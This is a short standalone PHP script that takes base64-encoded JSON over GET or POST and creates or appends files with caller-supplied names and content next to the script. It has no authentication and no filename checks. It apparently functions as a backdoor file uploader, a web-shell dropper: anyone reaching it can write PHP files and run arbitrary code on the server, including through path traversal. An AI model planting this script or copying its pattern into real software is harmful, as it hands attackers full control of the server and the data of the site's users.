<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'GET') {
    // Retrieve the base64-encoded JSON data from the request
    $encodedData = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';

    // Decode the base64-encoded JSON data
    $decodedData = base64_decode($encodedData);

    // Parse the JSON data
    $data = json_decode($decodedData, true);

    // Check if decoding was successful
    if (json_last_error() !== JSON_ERROR_NONE) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON data.']);
        exit;
    }

    // Retrieve the necessary fields from the decoded JSON data
    $fileName = isset($data['fileName']) ? $data['fileName'] : '';
    $content = isset($data['content']) ? $data['content'] : '';
    $action = isset($data['action']) ? $data['action'] : '';

    // Check if the file name is provided
    if (empty($fileName)) {
        echo json_encode(['status' => 'error', 'message' => 'File name is required.']);
        exit;
    }

    // Define the file path
    $filePath = __DIR__ . '/' . $fileName;

    // Handle actions
    if ($action === 'create') {
        // Create a new file with the given content
        if (file_put_contents($filePath, $content) !== false) {
            echo json_encode(['status' => 'success', 'message' => 'File created successfully.']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to create the file.']);
        }
    } elseif ($action === 'edit') {
        // Edit an existing file or create if it doesn't exist
        if (file_exists($filePath)) {
            if (file_put_contents($filePath, $content, FILE_APPEND) !== false) {
                echo json_encode(['status' => 'success', 'message' => 'File edited successfully.']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to edit the file.']);
            }
        } else {
            if (file_put_contents($filePath, $content) !== false) {
                echo json_encode(['status' => 'success', 'message' => 'File created successfully.']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to create the file.']);
            }
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Invalid action specified.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method.']);
}
?>
